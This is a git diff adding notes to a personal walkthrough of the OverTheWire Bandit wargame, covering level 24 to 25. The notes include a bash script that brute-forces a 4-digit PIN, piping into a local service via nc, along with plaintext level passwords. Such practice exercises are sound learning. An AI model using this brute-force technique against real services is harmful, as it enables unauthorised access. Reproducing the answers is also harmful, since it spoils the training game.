@@ -236,3 +236,25 @@ chmod +x get.sh // making it executable with chmod +x
 cat /tmp/rom/password.txt
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ssh -p 2220 bandit24@bandit.labs.overthewire.org
+
+lvl 24 --> lvl 25
+cat /etc/bandit_pass/bandit24
+mkdir /tmp/rom1
+cd /tmp/rom1
+nano hammer.sh
+
+// inside hammer.sh
+#!/bin/bash
+
+for i in {000..9999}
+do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done
+//
+
+chmod +x hammer.sh
+// to check the content of the first 100 : ./hammer.sh | head -n 100
+./hammer.sh > bruteforce.txt
+cat bruteforce.txt | nc localhost 30002
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+ssh -p 2220 bandit25@bandit.labs.overthewire.org
